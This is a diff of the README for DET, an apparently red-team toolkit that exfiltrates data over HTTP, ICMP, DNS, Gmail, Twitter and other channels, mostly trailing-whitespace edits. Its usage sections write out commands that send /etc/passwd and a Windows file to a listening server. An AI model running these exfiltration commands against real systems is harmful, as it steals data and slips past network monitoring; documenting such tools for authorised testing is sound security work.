@@ -16,35 +16,35 @@ Slides are available [here](https://docs.google.com/presentation/d/11uk6d-xougn3
 
 # Example usage (ICMP plugin)
 
-## Server-side: 
+## Server-side:
 
-[![asciicast](https://asciinema.org/a/18rjfp59rc7w27q7vlzlr96qv.png)](https://asciinema.org/a/18rjfp59rc7w27q7vlzlr96qv)
+```python det.py -p tcp,udp -c config-sample.json -L```
 
-## Client-side: 
+## Client-side:
 
-[![asciicast](https://asciinema.org/a/9m7ovlh7e4oyztx8e3fxyqsbl.png)](https://asciinema.org/a/9m7ovlh7e4oyztx8e3fxyqsbl)
+```python det.py -c config-sample.json -p tcp -f requirements.txt```
 
 
 # Usage while combining two channels (Gmail/Twitter)
 
-## Server-side: 
+## Server-side:
 
 [![asciicast](https://asciinema.org/a/9lfpo9m47y5sglvdd1kyb1lwj.png)](https://asciinema.org/a/9lfpo9m47y5sglvdd1kyb1lwj)
 
-## Client-side: 
+## Client-side:
 
 [![asciicast](https://asciinema.org/a/bfstssgptxd41ncces4981cn6.png)](https://asciinema.org/a/bfstssgptxd41ncces4981cn6)
 
 
 # Installation
 
-Clone the repo: 
+Clone the repo:
 
 ```bash
 git clone https://github.com/sensepost/DET.git
 ```
 
-Then: 
+Then:
 
 ```bash
 pip install -r requirements.txt --user
@@ -122,7 +122,7 @@ optional arguments:
   -L          Server mode
 ```
 
-## Server-side: 
+## Server-side:
 
 To load every plugin:
 
@@ -130,13 +130,13 @@ To load every plugin:
 python det.py -L -c ./config.json
 ```
 
-To load *only* twitter and gmail modules: 
+To load *only* twitter and gmail modules:
 
 ```bash
 python det.py -L -c ./config.json -p twitter,gmail
 ```
 
-To load every plugin and exclude DNS: 
+To load every plugin and exclude DNS:
 
 ```bash
 python det.py -L -c ./config.json -e dns
@@ -144,24 +144,24 @@ python det.py -L -c ./config.json -e dns
 
 ## Client-side:
 
-To load every plugin: 
+To load every plugin:
 
 ```bash
 python det.py -c ./config.json -f /etc/passwd
 ```
 
-To load *only* twitter and gmail modules: 
+To load *only* twitter and gmail modules:
 
 ```bash
 python det.py -c ./config.json -p twitter,gmail -f /etc/passwd
 ```
 
-To load every plugin and exclude DNS: 
+To load every plugin and exclude DNS:
 
 ```bash
 python det.py -c ./config.json -e dns -f /etc/passwd
 ```
-And in PowerShell (HTTP module): 
+And in PowerShell (HTTP module):
 
 ```powershell
 PS C:\Users\user01\Desktop>
@@ -171,7 +171,7 @@ PS C:\Users\user01\Desktop> HTTP-exfil 'C:\path\to\file.exe'
 
 # Modules
 
-So far, DET supports multiple protocols, listed here: 
+So far, DET supports multiple protocols, listed here:
 
 - [X] HTTP(S)
 - [X] ICMP
@@ -180,14 +180,14 @@ So far, DET supports multiple protocols, listed here:
 - [X] Raw TCP
 - [X] PowerShell implementation (HTTP, DNS, ICMP, SMTP (used with Gmail))
 
-And other "services": 
+And other "services":
 
 - [X] Google Docs (Unauthenticated)
 - [X] Twitter (Direct Messages)
 
 # Experimental modules
 
-So far, I am busy implementing new modules which are almost ready to ship, including: 
+So far, I am busy implementing new modules which are almost ready to ship, including:
 
 - [ ] Skype (95% done)
 - [ ] Tor (80% done)
@@ -202,10 +202,10 @@ So far, I am busy implementing new modules which are almost ready to ship, inclu
 
 # References
 
-Some pretty cool references/credits to people I got inspired by with their project: 
+Some pretty cool references/credits to people I got inspired by with their project:
 
 - [https://github.com/nullbind/Powershellery/](Powershellery) from Nullbind.
-- [https://github.com/ytisf/PyExfil](PyExfil), truely awesome. 
+- [https://github.com/ytisf/PyExfil](PyExfil), truely awesome.
 - [https://github.com/m57/dnsteal](dnsteal) from m57.
 - [https://github.com/3nc0d3r/NaishoDeNusumu](NaishoDeNusumu) from 3nc0d3r.
 - [https://github.com/glennzw/exphil](Exphil) from Glenn Wilkinson.
@@ -213,10 +213,10 @@ Some pretty cool references/credits to people I got inspired by with their proje
 
 # Contact/Contributing
 
-You can reach me on Twitter [@PaulWebSec](https://twitter.com/PaulWebSec). 
+You can reach me on Twitter [@PaulWebSec](https://twitter.com/PaulWebSec).
 Feel free if you want to contribute, clone, fork, submit your PR and so on.
 
 # License
 
-DET is licensed under a [MIT License](https://opensource.org/licenses/MIT). 
+DET is licensed under a [MIT License](https://opensource.org/licenses/MIT).
 Permissions beyond the scope of this license may be available at [info@sensepost.com](info@sensepost.com)
